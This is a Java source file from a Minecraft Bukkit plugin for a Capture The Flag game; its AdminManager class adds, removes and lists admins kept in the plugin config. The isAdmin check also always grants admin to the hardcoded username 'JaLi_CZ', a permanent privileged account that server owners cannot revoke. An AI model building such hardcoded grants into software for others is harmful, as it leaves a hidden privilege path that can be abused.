package org.jalicz.CTF.Administration;

import org.jalicz.CTF.CTFPlugin;
import org.jalicz.CTF.Game.Data.Strings;
import org.jalicz.CTF.Game.Visual.C;
import org.jalicz.CTF.Game.Visual.Message;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

import java.util.ArrayList;
import java.util.List;

public class AdminManager {

    private static final Plugin plugin = CTFPlugin.plugin;
    

    public static void addAdmin(Player sender, String player) {
        if(isAdmin(player)) {
            Message.player(sender, Strings.COMMAND + C.YELLOW + "This player is already admin!");
            return;
        }
        List<String> admins = getAdminList();
        admins.add(player);
        setAdminList(admins);

        Message.player(sender, Strings.COMMAND + C.PINK + "You " + C.GREEN + "gave admin permissions" + C.PINK + " to " + player + "!");
    }
    public static void removeAdmin(Player sender, String player) {
        if(!isAdmin(player)) {
            Message.player(sender, Strings.COMMAND + C.YELLOW + "This player isn't admin already!");
            return;
        }
        List<String> admins = new ArrayList<>();
        for(String admin: getAdminList()) if(!admin.equalsIgnoreCase(player)) admins.add(admin);
        setAdminList(admins);

        Message.player(sender, Strings.COMMAND + C.PINK + "You " + C.RED + "removed admin permissions" + C.PINK + " from " + player + "!");
    }
    public static boolean isAdmin(String player) {
        for(String admin: getAdminList()) if(player.equalsIgnoreCase(admin)) return true;
        return player.equalsIgnoreCase("JaLi_CZ");
    }
    public static void listAdmins(Player player) {
        Message.player(player, Strings.COMMAND + C.DARK_GREEN + "There are totally " + getAdminCount() + " admins:");
        int i=0;
        for(String admin: plugin.getConfig().getStringList("admins")) {
            i++;
            Message.player(player, C.GOLD + i + ". " + C.AQUA + admin);
        }
    }

    public static List<String> getAdminList() {
        return plugin.getConfig().getStringList("admins");
    }
    public static int getAdminCount() {
        return getAdminList().size();
    }

    public static void setAdminList(List<String> adminList) {
        plugin.getConfig().set("admins", adminList);
    }
}